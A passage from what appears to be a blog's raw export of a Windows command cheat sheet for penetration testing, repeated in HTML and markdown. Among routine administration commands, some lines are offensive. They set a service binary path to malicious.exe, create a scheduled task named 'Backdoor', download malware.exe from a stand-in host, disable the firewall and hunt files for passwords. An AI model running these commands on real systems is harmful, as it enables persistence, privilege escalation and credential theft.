<code>net</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">net</span> share                                <span class=\"built_in\">REM</span> List all shared folders on the local machine\n<span class=\"built_in\">net</span> view \\\\hostname                       <span class=\"built_in\">REM</span> List shared resources on a remote machine\n<span class=\"built_in\">net</span> use Z: \\\\hostname\\sharename /user:username password  <span class=\"built_in\">REM</span> Map a network drive using specific credentials</code></pre>\n\n<br>\n\n<h3 id=\"smbclient-for-SMB-Connections-from-Linux-Windows-with-Cygwin\"><a href=\"#smbclient-for-SMB-Connections-from-Linux-Windows-with-Cygwin\" class=\"headerlink\" title=\"smbclient for SMB Connections (from Linux&#x2F;Windows with Cygwin)\"></a><code>smbclient</code> for SMB Connections (from Linux&#x2F;Windows with Cygwin)</h3><pre><code class=\"highlight bat\">smbclient -L \\\\hostname -U username       <span class=\"built_in\">REM</span> List shares on a remote SMB server\nsmbclient //hostname/sharename -U username  <span class=\"built_in\">REM</span> Connect to a specific share</code></pre>\n\n<br>\n\n<h3 id=\"powershell-Networking\"><a href=\"#powershell-Networking\" class=\"headerlink\" title=\"powershell Networking\"></a><code>powershell</code> Networking</h3><pre><code class=\"highlight bat\">powershell &quot;Test-Connection -ComputerName hostname -Count <span class=\"number\">4</span>&quot;  <span class=\"built_in\">REM</span> <span class=\"built_in\">Ping</span> a host <span class=\"number\">4</span> times using PowerShell\npowershell &quot;Get-NetTCPConnection -State Listen&quot;  <span class=\"built_in\">REM</span> List all listening ports using PowerShell\npowershell &quot;Invoke-WebRequest -Uri http://example.com&quot;  <span class=\"built_in\">REM</span> Make a web request using PowerShell</code></pre>\n\n<br>\n\n<h2 id=\"Services\"><a href=\"#Services\" class=\"headerlink\" title=\"Services\"></a>Services</h2><h3 id=\"Service-Management-with-sc\"><a href=\"#Service-Management-with-sc\" class=\"headerlink\" title=\"Service Management with sc\"></a>Service Management with <code>sc</code></h3><pre><code class=\"highlight bat\">sc query &lt;service_name&gt;                   <span class=\"built_in\">REM</span> Query the status of a service\nsc qc &lt;service_name&gt;                      <span class=\"built_in\">REM</span> Query the service configuration (useful <span class=\"keyword\">for</span> finding paths and weak permissions)\nsc stop &lt;service_name&gt;                    <span class=\"built_in\">REM</span> Stop a service\nsc <span class=\"built_in\">start</span> &lt;service_name&gt;                   <span class=\"built_in\">REM</span> <span class=\"built_in\">Start</span> a service\nsc config &lt;service_name&gt; binPath= &quot;C:\\<span class=\"built_in\">path</span>\\to\\malicious.exe&quot;  <span class=\"built_in\">REM</span> Change the executable <span class=\"built_in\">path</span> <span class=\"keyword\">for</span> a service (privilege escalation technique)\nsc delete &lt;service_name&gt;                  <span class=\"built_in\">REM</span> Delete a service</code></pre>\n\n<br>\n\n<h3 id=\"Windows-Services-with-wmic\"><a href=\"#Windows-Services-with-wmic\" class=\"headerlink\" title=\"Windows Services with wmic\"></a>Windows Services with <code>wmic</code></h3><pre><code class=\"highlight bat\">wmic service get name, displayname, startmode, state  <span class=\"built_in\">REM</span> List all services, their display names, <span class=\"built_in\">start</span> modes, and current states\nwmic process where &quot;name=&#x27;svchost.exe&#x27;&quot; get processid, commandline  <span class=\"built_in\">REM</span> List all instances of svchost with their command lines</code></pre>\n\n<br>\n\n<h2 id=\"Task-Management\"><a href=\"#Task-Management\" class=\"headerlink\" title=\"Task Management\"></a>Task Management</h2><h3 id=\"Process-Management-with-tasklist-and-taskkill\"><a href=\"#Process-Management-with-tasklist-and-taskkill\" class=\"headerlink\" title=\"Process Management with tasklist and taskkill\"></a>Process Management with <code>tasklist</code> and <code>taskkill</code></h3><pre><code class=\"highlight bat\">tasklist                                  <span class=\"built_in\">REM</span> List all running processes\ntasklist /svc                             <span class=\"built_in\">REM</span> List services hosted <span class=\"keyword\">in</span> each svchost process\ntasklist /v                               <span class=\"built_in\">REM</span> Display detailed information about each process, including window <span class=\"built_in\">title</span>\n<span class=\"built_in\">taskkill</span> /PID &lt;PID&gt;                       <span class=\"built_in\">REM</span> Kill a process by PID\n<span class=\"built_in\">taskkill</span> /IM &lt;process_name&gt;               <span class=\"built_in\">REM</span> Kill a process by name\n<span class=\"built_in\">taskkill</span> /F /PID &lt;PID&gt;                    <span class=\"built_in\">REM</span> Forcefully kill a process by PID</code></pre>\n\n<br>\n\n<h3 id=\"Scheduling-Tasks-with-schtasks\"><a href=\"#Scheduling-Tasks-with-schtasks\" class=\"headerlink\" title=\"Scheduling Tasks with schtasks\"></a>Scheduling Tasks with <code>schtasks</code></h3><pre><code class=\"highlight bat\">schtasks /query /fo LIST /v               <span class=\"built_in\">REM</span> List all scheduled tasks with detailed information\nschtasks /create /tn &quot;Backdoor&quot; /tr &quot;C:\\<span class=\"built_in\">path</span>\\to\\malicious.exe&quot; /sc daily /st <span class=\"number\">12</span>:<span class=\"number\">00</span>  <span class=\"built_in\">REM</span> Create a scheduled task to run a malicious file daily <span class=\"built_in\">at</span> noon\nschtasks /delete /tn &quot;TaskName&quot; /f        <span class=\"built_in\">REM</span> Delete a scheduled task by name, without prompting <span class=\"keyword\">for</span> confirmation</code></pre>\n\n<br>\n\n<h2 id=\"PowerShell-Advanced-Commands\"><a href=\"#PowerShell-Advanced-Commands\" class=\"headerlink\" title=\"PowerShell - Advanced Commands\"></a>PowerShell - Advanced Commands</h2><h3 id=\"File-and-Directory-Enumeration\"><a href=\"#File-and-Directory-Enumeration\" class=\"headerlink\" title=\"File and Directory Enumeration\"></a>File and Directory Enumeration</h3><pre><code class=\"highlight bat\">Get-ChildItem -Recurse -Force | Where-Object &#123; $_.Attributes -match &quot;Hidden&quot; &#125;  <span class=\"built_in\">REM</span> List all hidden files recursively\nGet-Acl C:\\<span class=\"built_in\">path</span>\\to\\file.txt | <span class=\"built_in\">Format</span>-List  <span class=\"built_in\">REM</span> Get detailed ACL information <span class=\"keyword\">for</span> a specific file</code></pre>\n\n<br>\n\n<h3 id=\"Downloading-Files\"><a href=\"#Downloading-Files\" class=\"headerlink\" title=\"Downloading Files\"></a>Downloading Files</h3><pre><code class=\"highlight bat\">Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\<span class=\"built_in\">path</span>\\to\\malware.exe  <span class=\"built_in\">REM</span> Download a file from a URL and save it locally</code></pre>\n\n<br>\n\n<h3 id=\"Running-Commands-Remotely\"><a href=\"#Running-Commands-Remotely\" class=\"headerlink\" title=\"Running Commands Remotely\"></a>Running Commands Remotely</h3><pre><code class=\"highlight bat\">Invoke-Command -ComputerName hostname -ScriptBlock &#123; Get-Service &#125;  <span class=\"built_in\">REM</span> Run a command on a remote computer to list services\nEnter-PSSession -ComputerName hostname  <span class=\"built_in\">REM</span> Establish an interactive session with a remote computer</code></pre>\n\n<br>\n\n<h2 id=\"Miscellaneous\"><a href=\"#Miscellaneous\" class=\"headerlink\" title=\"Miscellaneous\"></a>Miscellaneous</h2><h3 id=\"Environment-Variables\"><a href=\"#Environment-Variables\" class=\"headerlink\" title=\"Environment Variables\"></a>Environment Variables</h3><pre><code class=\"highlight bat\"><span class=\"built_in\">set</span>                                        <span class=\"built_in\">REM</span> List all environment variables\nsetx VAR_NAME &quot;Value&quot;                      <span class=\"built_in\">REM</span> <span class=\"built_in\">Set</span> a new environment variable permanently\n<span class=\"built_in\">set</span> <span class=\"built_in\">path</span>=C:\\newpath;<span class=\"variable\">%path%</span>                 <span class=\"built_in\">REM</span> Temporarily modify the <span class=\"built_in\">PATH</span> environment variable</code></pre>\n\n<br>\n\n<h3 id=\"System-Control\"><a href=\"#System-Control\" class=\"headerlink\" title=\"System Control\"></a>System Control</h3><pre><code class=\"highlight bat\">shutdown /s /f /t <span class=\"number\">0</span>                        <span class=\"built_in\">REM</span> Shutdown the computer immediately\nshutdown /r /f /t <span class=\"number\">0</span>                        <span class=\"built_in\">REM</span> Restart the computer immediately</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>.</p>\n<hr>","more":"<h2 id=\"General-Information\"><a href=\"#General-Information\" class=\"headerlink\" title=\"General Information\"></a>General Information</h2><h3 id=\"User-Information\"><a href=\"#User-Information\" class=\"headerlink\" title=\"User Information\"></a>User Information</h3><pre><code class=\"highlight bat\"><span class=\"built_in\">echo</span> <span class=\"variable\">%username%</span>                         <span class=\"built_in\">REM</span> Display the current username\nwhoami /all                             <span class=\"built_in\">REM</span> Show detailed user information, groups, privileges, and SID\n<span class=\"built_in\">net</span> user                                <span class=\"built_in\">REM</span> List all user accounts on the local machine\n<span class=\"built_in\">net</span> localgroup administrators           <span class=\"built_in\">REM</span> List members of the Administrators group</code></pre>\n\n<br>\n\n<h3 id=\"System-Information\"><a href=\"#System-Information\" class=\"headerlink\" title=\"System Information\"></a>System Information</h3><pre><code class=\"highlight bat\">systeminfo                              <span class=\"built_in\">REM</span> Display detailed system configuration, OS version, etc.\nwmic qfe list brief /<span class=\"built_in\">format</span>:table       <span class=\"built_in\">REM</span> List installed hotfixes and patches\nwmic os get caption, version, csname    <span class=\"built_in\">REM</span> Display the Windows version, OS name, and computer name\nwmic product get name, version          <span class=\"built_in\">REM</span> List all installed software with versions (useful <span class=\"keyword\">for</span> finding vulnerable software)</code></pre>\n\n<br>\n\n<h3 id=\"Registry-Information\"><a href=\"#Registry-Information\" class=\"headerlink\" title=\"Registry Information\"></a>Registry Information</h3><pre><code class=\"highlight bat\">reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run               <span class=\"built_in\">REM</span> List programs <span class=\"built_in\">set</span> to run <span class=\"built_in\">at</span> startup\nreg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; /v ProxyServer  <span class=\"built_in\">REM</span> Check proxy settings\nreg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa&quot; /v RestrictAnonymous  <span class=\"built_in\">REM</span> Check <span class=\"keyword\">if</span> anonymous enumeration of SAM accounts is restricted\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  <span class=\"built_in\">REM</span> Check <span class=\"keyword\">if</span> MSI packages can be installed with elevated privileges</code></pre>\n\n<br>\n\n<h2 id=\"Filesystem\"><a href=\"#Filesystem\" class=\"headerlink\" title=\"Filesystem\"></a>Filesystem</h2><h3 id=\"Directory-and-File-Operations-with-dir\"><a href=\"#Directory-and-File-Operations-with-dir\" class=\"headerlink\" title=\"Directory and File Operations with dir\"></a>Directory and File Operations with <code>dir</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">dir</span> /A:D                                 <span class=\"built_in\">REM</span> List directories only\n<span class=\"built_in\">dir</span> /A:HS                                <span class=\"built_in\">REM</span> List hidden and system files\n<span class=\"built_in\">dir</span> /O:S                                 <span class=\"built_in\">REM</span> <span class=\"built_in\">Sort</span> files by size\n<span class=\"built_in\">dir</span> /Q                                   <span class=\"built_in\">REM</span> Show file owners\n<span class=\"built_in\">dir</span> /T:C                                 <span class=\"built_in\">REM</span> Show creation <span class=\"built_in\">time</span>\n<span class=\"built_in\">dir</span> /S /B                                <span class=\"built_in\">REM</span> Recursive search, bare <span class=\"built_in\">format</span> (useful <span class=\"keyword\">for</span> finding specific files like passwords or sensitive documents)</code></pre>\n\n<br>\n\n<h3 id=\"File-Searching-with-findstr\"><a href=\"#File-Searching-with-findstr\" class=\"headerlink\" title=\"File Searching with findstr\"></a>File Searching with <code>findstr</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">findstr</span> /si &quot;password&quot; *.txt             <span class=\"built_in\">REM</span> Search <span class=\"keyword\">for</span> the word &quot;password&quot; <span class=\"keyword\">in</span> all .txt files (case-insensitive)\n<span class=\"built_in\">findstr</span> /R /S &quot;regex_pattern&quot; *.config   <span class=\"built_in\">REM</span> Search using regular expressions across all .config files recursively</code></pre>\n\n<br>\n\n<h3 id=\"File-and-Directory-Takeover\"><a href=\"#File-and-Directory-Takeover\" class=\"headerlink\" title=\"File and Directory Takeover\"></a>File and Directory Takeover</h3><pre><code class=\"highlight bat\">takeown /F &lt;file_or_folder&gt; /A           <span class=\"built_in\">REM</span> Take ownership of a file or folder\nicacls &lt;file_or_folder&gt; /grant <span class=\"variable\">%username%</span>:F  <span class=\"built_in\">REM</span> Grant full control to the current user</code></pre>\n\n<br>\n\n<h2 id=\"Permissions\"><a href=\"#Permissions\" class=\"headerlink\" title=\"Permissions\"></a>Permissions</h2><h3 id=\"icacls-Managing-Permissions\"><a href=\"#icacls-Managing-Permissions\" class=\"headerlink\" title=\"icacls - Managing Permissions\"></a><code>icacls</code> - Managing Permissions</h3><pre><code class=\"highlight bat\">icacls &lt;file_or_folder&gt;                   <span class=\"built_in\">REM</span> Show permissions <span class=\"keyword\">for</span> a file or folder\nicacls &lt;file_or_folder&gt; /grant &lt;user&gt;:(F) <span class=\"built_in\">REM</span> Grant full control to a user\nicacls &lt;file_or_folder&gt; /deny &lt;user&gt;:(D)  <span class=\"built_in\">REM</span> Deny delete permissions to a user\nicacls &lt;file_or_folder&gt; /inheritance:e    <span class=\"built_in\">REM</span> Enable inheritance <span class=\"keyword\">for</span> a file or folder\nicacls &lt;file_or_folder&gt; /save aclfile.txt <span class=\"built_in\">REM</span> Backup ACLs to a file\nicacls &lt;file_or_folder&gt; /<span class=\"built_in\">restore</span> aclfile.txt  <span class=\"built_in\">REM</span> <span class=\"built_in\">Restore</span> ACLs from a file\nicacls &lt;file_or_folder&gt; /reset            <span class=\"built_in\">REM</span> Reset permissions to default</code></pre>\n<pre><code class=\"highlight batch\">F    : Full control  Grants complete access to the file or directory, including the ability to modify permissions.\nM    : Modify  Allows reading, writing, and deleting the file or directory but does not include permission changes.\nRX   : Read and execute  Allows reading the file and executing it (if it&#x27;s executable), or listing the directory and accessing its contents.\nR    : Read  Permits reading the file or listing the directory&#x27;s contents.\nW    : Write  Allows writing to the file or adding files to the directory.\nD    : Delete  Grants the ability to delete the file or directory.\nX    : Traverse  Permits moving through a directory to access other files or directories.\nS    : Synchronize  Enables synchronization of operations on the file or directory, useful for process synchronization.</code></pre>\n\n<br>\n\n<h3 id=\"Access-Control-with-accesschk\"><a href=\"#Access-Control-with-accesschk\" class=\"headerlink\" title=\"Access Control with accesschk\"></a>Access Control with <code>accesschk</code></h3><pre><code class=\"highlight bat\">accesschk.exe -uws &lt;username&gt; *           <span class=\"built_in\">REM</span> Show all objects with write access <span class=\"keyword\">for</span> a specific user (Sysinternals)\naccesschk.exe -p &lt;processname&gt;            <span class=\"built_in\">REM</span> Check permissions on a specific process (useful <span class=\"keyword\">for</span> privilege escalation)</code></pre>\n\n<br>\n\n<h2 id=\"Networking\"><a href=\"#Networking\" class=\"headerlink\" title=\"Networking\"></a>Networking</h2><h3 id=\"Network-Configuration-with-ipconfig\"><a href=\"#Network-Configuration-with-ipconfig\" class=\"headerlink\" title=\"Network Configuration with ipconfig\"></a>Network Configuration with <code>ipconfig</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">ipconfig</span> /all                             <span class=\"built_in\">REM</span> Display all network configuration\n<span class=\"built_in\">ipconfig</span> /displaydns                      <span class=\"built_in\">REM</span> Show the DNS resolver cache\n<span class=\"built_in\">ipconfig</span> /flushdns                        <span class=\"built_in\">REM</span> Flush DNS resolver cache (useful <span class=\"keyword\">for</span> clearing potential logs or testing DNS issues)\n<span class=\"built_in\">ipconfig</span> /release                         <span class=\"built_in\">REM</span> Release the current IP address\n<span class=\"built_in\">ipconfig</span> /renew                           <span class=\"built_in\">REM</span> Renew the IP address</code></pre>\n\n<br>\n\n<h3 id=\"Network-Connections-with-netstat\"><a href=\"#Network-Connections-with-netstat\" class=\"headerlink\" title=\"Network Connections with netstat\"></a>Network Connections with <code>netstat</code></h3><pre><code class=\"highlight bat\">netstat -an                               <span class=\"built_in\">REM</span> Show all active connections and listening ports\nnetstat -b                                <span class=\"built_in\">REM</span> Show the executable tied to each connection\nnetstat -r                                <span class=\"built_in\">REM</span> Show the routing table\nnetstat -o                                <span class=\"built_in\">REM</span> Show active connections with the associated process ID (PID)\nnetstat -ano | <span class=\"built_in\">findstr</span> :<span class=\"number\">80</span>                <span class=\"built_in\">REM</span> <span class=\"built_in\">Find</span> connections on port <span class=\"number\">80</span></code></pre>\n\n<br>\n\n<h3 id=\"ARP-Cache-with-arp\"><a href=\"#ARP-Cache-with-arp\" class=\"headerlink\" title=\"ARP Cache with arp\"></a>ARP Cache with <code>arp</code></h3><pre><code class=\"highlight bat\">arp -a                                    <span class=\"built_in\">REM</span> Show ARP cache\narp -d                                    <span class=\"built_in\">REM</span> Clear ARP cache</code></pre>\n\n<br>\n\n<h3 id=\"Windows-Firewall-with-netsh\"><a href=\"#Windows-Firewall-with-netsh\" class=\"headerlink\" title=\"Windows Firewall with netsh\"></a>Windows Firewall with <code>netsh</code></h3><pre><code class=\"highlight bat\">netsh advfirewall show currentprofile     <span class=\"built_in\">REM</span> Display the active firewall profile settings\nnetsh advfirewall <span class=\"built_in\">set</span> currentprofile state off  <span class=\"built_in\">REM</span> Disable the active firewall profile (requires admin)\nnetsh advfirewall firewall add rule name=&quot;Allow SSH&quot; protocol=TCP <span class=\"built_in\">dir</span>=<span class=\"keyword\">in</span> localport=<span class=\"number\">22</span> action=allow  <span class=\"built_in\">REM</span> Add a firewall rule to allow SSH on port <span class=\"number\">22</span></code></pre>\n\n<br>\n\n<h3 id=\"Shares-with-net\"><a href=\"#Shares-with-net\" class=\"headerlink\" title=\"Shares with net\"></a>Shares with <code>net</code></h3><pre><code class=\"highlight bat\"><span class=\"built_in\">net</span> share                                <span class=\"built_in\">REM</span> List all shared folders on the local machine\n<span class=\"built_in\">net</span> view \\\\hostname                       <span class=\"built_in\">REM</span> List shared resources on a remote machine\n<span class=\"built_in\">net</span> use Z: \\\\hostname\\sharename /user:username password  <span class=\"built_in\">REM</span> Map a network drive using specific credentials</code></pre>\n\n<br>\n\n<h3 id=\"smbclient-for-SMB-Connections-from-Linux-Windows-with-Cygwin\"><a href=\"#smbclient-for-SMB-Connections-from-Linux-Windows-with-Cygwin\" class=\"headerlink\" title=\"smbclient for SMB Connections (from Linux&#x2F;Windows with Cygwin)\"></a><code>smbclient</code> for SMB Connections (from Linux&#x2F;Windows with Cygwin)</h3><pre><code class=\"highlight bat\">smbclient -L \\\\hostname -U username       <span class=\"built_in\">REM</span> List shares on a remote SMB server\nsmbclient //hostname/sharename -U username  <span class=\"built_in\">REM</span> Connect to a specific share</code></pre>\n\n<br>\n\n<h3 id=\"powershell-Networking\"><a href=\"#powershell-Networking\" class=\"headerlink\" title=\"powershell Networking\"></a><code>powershell</code> Networking</h3><pre><code class=\"highlight bat\">powershell &quot;Test-Connection -ComputerName hostname -Count <span class=\"number\">4</span>&quot;  <span class=\"built_in\">REM</span> <span class=\"built_in\">Ping</span> a host <span class=\"number\">4</span> times using PowerShell\npowershell &quot;Get-NetTCPConnection -State Listen&quot;  <span class=\"built_in\">REM</span> List all listening ports using PowerShell\npowershell &quot;Invoke-WebRequest -Uri http://example.com&quot;  <span class=\"built_in\">REM</span> Make a web request using PowerShell</code></pre>\n\n<br>\n\n<h2 id=\"Services\"><a href=\"#Services\" class=\"headerlink\" title=\"Services\"></a>Services</h2><h3 id=\"Service-Management-with-sc\"><a href=\"#Service-Management-with-sc\" class=\"headerlink\" title=\"Service Management with sc\"></a>Service Management with <code>sc</code></h3><pre><code class=\"highlight bat\">sc query &lt;service_name&gt;                   <span class=\"built_in\">REM</span> Query the status of a service\nsc qc &lt;service_name&gt;                      <span class=\"built_in\">REM</span> Query the service configuration (useful <span class=\"keyword\">for</span> finding paths and weak permissions)\nsc stop &lt;service_name&gt;                    <span class=\"built_in\">REM</span> Stop a service\nsc <span class=\"built_in\">start</span> &lt;service_name&gt;                   <span class=\"built_in\">REM</span> <span class=\"built_in\">Start</span> a service\nsc config &lt;service_name&gt; binPath= &quot;C:\\<span class=\"built_in\">path</span>\\to\\malicious.exe&quot;  <span class=\"built_in\">REM</span> Change the executable <span class=\"built_in\">path</span> <span class=\"keyword\">for</span> a service (privilege escalation technique)\nsc delete &lt;service_name&gt;                  <span class=\"built_in\">REM</span> Delete a service</code></pre>\n\n<br>\n\n<h3 id=\"Windows-Services-with-wmic\"><a href=\"#Windows-Services-with-wmic\" class=\"headerlink\" title=\"Windows Services with wmic\"></a>Windows Services with <code>wmic</code></h3><pre><code class=\"highlight bat\">wmic service get name, displayname, startmode, state  <span class=\"built_in\">REM</span> List all services, their display names, <span class=\"built_in\">start</span> modes, and current states\nwmic process where &quot;name=&#x27;svchost.exe&#x27;&quot; get processid, commandline  <span class=\"built_in\">REM</span> List all instances of svchost with their command lines</code></pre>\n\n<br>\n\n<h2 id=\"Task-Management\"><a href=\"#Task-Management\" class=\"headerlink\" title=\"Task Management\"></a>Task Management</h2><h3 id=\"Process-Management-with-tasklist-and-taskkill\"><a href=\"#Process-Management-with-tasklist-and-taskkill\" class=\"headerlink\" title=\"Process Management with tasklist and taskkill\"></a>Process Management with <code>tasklist</code> and <code>taskkill</code></h3><pre><code class=\"highlight bat\">tasklist                                  <span class=\"built_in\">REM</span> List all running processes\ntasklist /svc                             <span class=\"built_in\">REM</span> List services hosted <span class=\"keyword\">in</span> each svchost process\ntasklist /v                               <span class=\"built_in\">REM</span> Display detailed information about each process, including window <span class=\"built_in\">title</span>\n<span class=\"built_in\">taskkill</span> /PID &lt;PID&gt;                       <span class=\"built_in\">REM</span> Kill a process by PID\n<span class=\"built_in\">taskkill</span> /IM &lt;process_name&gt;               <span class=\"built_in\">REM</span> Kill a process by name\n<span class=\"built_in\">taskkill</span> /F /PID &lt;PID&gt;                    <span class=\"built_in\">REM</span> Forcefully kill a process by PID</code></pre>\n\n<br>\n\n<h3 id=\"Scheduling-Tasks-with-schtasks\"><a href=\"#Scheduling-Tasks-with-schtasks\" class=\"headerlink\" title=\"Scheduling Tasks with schtasks\"></a>Scheduling Tasks with <code>schtasks</code></h3><pre><code class=\"highlight bat\">schtasks /query /fo LIST /v               <span class=\"built_in\">REM</span> List all scheduled tasks with detailed information\nschtasks /create /tn &quot;Backdoor&quot; /tr &quot;C:\\<span class=\"built_in\">path</span>\\to\\malicious.exe&quot; /sc daily /st <span class=\"number\">12</span>:<span class=\"number\">00</span>  <span class=\"built_in\">REM</span> Create a scheduled task to run a malicious file daily <span class=\"built_in\">at</span> noon\nschtasks /delete /tn &quot;TaskName&quot; /f        <span class=\"built_in\">REM</span> Delete a scheduled task by name, without prompting <span class=\"keyword\">for</span> confirmation</code></pre>\n\n<br>\n\n<h2 id=\"PowerShell-Advanced-Commands\"><a href=\"#PowerShell-Advanced-Commands\" class=\"headerlink\" title=\"PowerShell - Advanced Commands\"></a>PowerShell - Advanced Commands</h2><h3 id=\"File-and-Directory-Enumeration\"><a href=\"#File-and-Directory-Enumeration\" class=\"headerlink\" title=\"File and Directory Enumeration\"></a>File and Directory Enumeration</h3><pre><code class=\"highlight bat\">Get-ChildItem -Recurse -Force | Where-Object &#123; $_.Attributes -match &quot;Hidden&quot; &#125;  <span class=\"built_in\">REM</span> List all hidden files recursively\nGet-Acl C:\\<span class=\"built_in\">path</span>\\to\\file.txt | <span class=\"built_in\">Format</span>-List  <span class=\"built_in\">REM</span> Get detailed ACL information <span class=\"keyword\">for</span> a specific file</code></pre>\n\n<br>\n\n<h3 id=\"Downloading-Files\"><a href=\"#Downloading-Files\" class=\"headerlink\" title=\"Downloading Files\"></a>Downloading Files</h3><pre><code class=\"highlight bat\">Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile C:\\<span class=\"built_in\">path</span>\\to\\malware.exe  <span class=\"built_in\">REM</span> Download a file from a URL and save it locally</code></pre>\n\n<br>\n\n<h3 id=\"Running-Commands-Remotely\"><a href=\"#Running-Commands-Remotely\" class=\"headerlink\" title=\"Running Commands Remotely\"></a>Running Commands Remotely</h3><pre><code class=\"highlight bat\">Invoke-Command -ComputerName hostname -ScriptBlock &#123; Get-Service &#125;  <span class=\"built_in\">REM</span> Run a command on a remote computer to list services\nEnter-PSSession -ComputerName hostname  <span class=\"built_in\">REM</span> Establish an interactive session with a remote computer</code></pre>\n\n<br>\n\n<h2 id=\"Miscellaneous\"><a href=\"#Miscellaneous\" class=\"headerlink\" title=\"Miscellaneous\"></a>Miscellaneous</h2><h3 id=\"Environment-Variables\"><a href=\"#Environment-Variables\" class=\"headerlink\" title=\"Environment Variables\"></a>Environment Variables</h3><pre><code class=\"highlight bat\"><span class=\"built_in\">set</span>                                        <span class=\"built_in\">REM</span> List all environment variables\nsetx VAR_NAME &quot;Value&quot;                      <span class=\"built_in\">REM</span> <span class=\"built_in\">Set</span> a new environment variable permanently\n<span class=\"built_in\">set</span> <span class=\"built_in\">path</span>=C:\\newpath;<span class=\"variable\">%path%</span>                 <span class=\"built_in\">REM</span> Temporarily modify the <span class=\"built_in\">PATH</span> environment variable</code></pre>\n\n<br>\n\n<h3 id=\"System-Control\"><a href=\"#System-Control\" class=\"headerlink\" title=\"System Control\"></a>System Control</h3><pre><code class=\"highlight bat\">shutdown /s /f /t <span class=\"number\">0</span>                        <span class=\"built_in\">REM</span> Shutdown the computer immediately\nshutdown /r /f /t <span class=\"number\">0</span>                        <span class=\"built_in\">REM</span> Restart the computer immediately</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"Windows - Commands - part 2","date":"2024-08-03T09:00:00.000Z","toc":true,"_content":"\n---\n.\n\n---\n<!-- more -->\n\n## General Information\n\n### User Information\n```bat\necho %username%                         REM Display the current username\nwhoami /all                             REM Show detailed user information, groups, privileges, and SID\nnet user                                REM List all user accounts on the local machine\nnet localgroup administrators           REM List members of the Administrators group\n```\n```bat\nwhoami /priv                            REM View privileges - look for SeImpersonaPrivilege - potato\n```\n\n<br>\n\n### System Information\n```bat\nsysteminfo                              REM Display detailed system configuration, OS version, etc.\nwmic qfe list brief /format:table       REM List installed hotfixes and patches\nwmic os get caption, version, csname    REM Display the Windows version, OS name, and computer name\nwmic product get name, version          REM List all installed software with versions (useful for finding vulnerable software)\n```\n\n<br>\n\n### Registry Information\n```bat\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run               REM List programs set to run at startup\nreg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer  REM Check proxy settings\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RestrictAnonymous  REM Check if anonymous enumeration of SAM accounts is restricted\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated  REM Check if MSI packages can be installed with elevated privileges\n```\n\n<br>\n\n## Filesystem\n\n## Drivers\n```batch\nfsutil fsinfo drives      REM View drivers available\n```\n\n### Directory and File Operations with `dir`\n```bat\ndir /A:D                                 REM List directories only\ndir /A:HS                                REM List hidden and system files\ndir /O:S                                 REM Sort files by size\ndir /Q                                   REM Show file owners\ndir /T:C                                 REM Show creation time\ndir /S /B                                REM Recursive search, bare format (useful for finding specific files like passwords or sensitive documents)\n```\n\n<br>\n\n### File Searching with `findstr`\n```bat\nfindstr /si \"password\" *.txt             REM Search for the word \"password\" in all .txt files (case-insensitive)\nfindstr /R /S \"regex_pattern\" *.config   REM Search using regular expressions across all .config files recursively\n```\n\n<br>\n\n### File and Directory Takeover\n```bat\ntakeown /F <file_or_folder> /A           REM Take ownership of a file or folder\nicacls <file_or_folder> /grant %username%:F  REM Grant full control to the current user\n```\n\n<br>\n\n## Permissions\n\n### `icacls` - Managing Permissions\n```bat\nicacls <file_or_folder>                   REM Show permissions for a file or folder\nicacls <file_or_folder> /grant <user>:(F) REM Grant full control to a user\nicacls <file_or_folder> /deny <user>:(D)  REM Deny delete permissions to a user\nicacls <file_or_folder> /inheritance:e    REM Enable inheritance for a file or folder\nicacls <file_or_folder> /save aclfile.txt REM Backup ACLs to a file\nicacls <file_or_folder> /restore aclfile.txt  REM Restore ACLs from a file\nicacls <file_or_folder> /reset            REM Reset permissions to default\n```\n```batch\nF    : Full control  Grants complete access to the file or directory, including the ability to modify permissions.\nM    : Modify  Allows reading, writing, and deleting the file or directory but does not include permission changes.\nRX   : Read and execute  Allows reading the file and executing it (if it's executable), or listing the directory and accessing its contents.\nR    : Read  Permits reading the file or listing the directory's contents.\nW    : Write  Allows writing to the file or adding files to the directory.\nD    : Delete  Grants the ability to delete the file or directory.\nX    : Traverse  Permits moving through a directory to access other files or directories.\nS    : Synchronize  Enables synchronization of operations on the file or directory, useful for process synchronization.\n```\n\n<br>\n\n### Access Control with `accesschk`\n```bat\naccesschk.exe -uws <username> *           REM Show all objects with write access for a specific user (Sysinternals)\naccesschk.exe -p <processname>            REM Check permissions on a specific process (useful for privilege escalation)\n```\n\n<br>\n\n## Networking\n\n### Network Configuration with `ipconfig`\n```bat\nipconfig /all                             REM Display all network configuration\nipconfig /displaydns                      REM Show the DNS resolver cache\nipconfig /flushdns                        REM Flush DNS resolver cache (useful for clearing potential logs or testing DNS issues)\nipconfig /release                         REM Release the current IP address\nipconfig /renew                           REM Renew the IP address\n```\n\n<br>\n\n### Network Connections with `netstat`\n```bat\nnetstat -an                               REM Show all active connections and listening ports\nnetstat -b                                REM Show the executable tied to each connection\nnetstat -r                                REM Show the routing table\nnetstat -o                                REM Show active connections with the associated process ID (PID)\nnetstat -ano | findstr :80                REM Find connections on port 80\n```\n\n<br>\n\n### ARP Cache with `arp`\n```bat\narp -a                                    REM Show ARP cache\narp -d                                    REM Clear ARP cache\n```\n\n<br>\n\n### Windows Firewall with `netsh`\n```bat\nnetsh advfirewall show currentprofile     REM Display the active firewall profile settings\nnetsh advfirewall set currentprofile state off  REM Disable the active firewall profile (requires admin)\nnetsh advfirewall firewall add rule name=\"Allow 